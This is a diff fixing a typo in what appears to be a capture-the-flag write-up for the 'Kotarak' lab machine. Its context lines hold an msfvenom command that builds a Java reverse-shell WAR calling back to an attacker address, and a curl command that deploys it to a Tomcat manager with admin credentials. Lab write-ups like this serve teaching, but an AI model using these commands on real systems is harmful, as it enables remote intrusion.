@@ -204,7 +204,7 @@ Green! we're good to go
 msfvenom -p java/shell_reverse_tcp lhost=10.10.16.5 lport=9000 -f war -o letmein.war
 ```
 
-and **upload the it** with `curl`
+and **upload it** with `curl`
 ```bash
 curl -v -u admin:'3@g01PdhB!' --upload-file letmein.war "http://kotarak:8080/manager/text/deploy?path=/shell&update=true"
 ```
